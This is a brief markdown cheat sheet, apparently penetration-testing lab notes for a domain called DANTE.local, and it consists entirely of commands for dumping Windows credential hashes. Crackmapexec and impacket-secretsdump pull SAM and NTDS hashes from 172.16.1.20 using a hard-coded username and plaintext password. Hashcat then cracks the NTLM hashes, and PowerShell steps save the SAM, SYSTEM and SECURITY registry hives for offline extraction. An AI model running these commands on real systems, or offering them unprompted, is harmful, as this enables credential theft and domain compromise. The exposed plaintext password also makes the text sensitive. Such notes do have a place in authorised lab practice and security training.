# Dump Hashes

## Using SMB

```bash
crackmapexec smb 172.16.1.20 -u katwamba -p DishonestSupermanDiablo5679 --sam
crackmapexec smb 172.16.1.20 -u katwamba -p DishonestSupermanDiablo5679 --ntds

impacket-secretsdump DANTE.local/katwamba:DishonestSupermanDiablo5679@172.16.1.20

# Crack the hashes
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Powershell

```powershell
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security
secretsdump.py -sam sam -system system -security security LOCAL > hashes.txt
```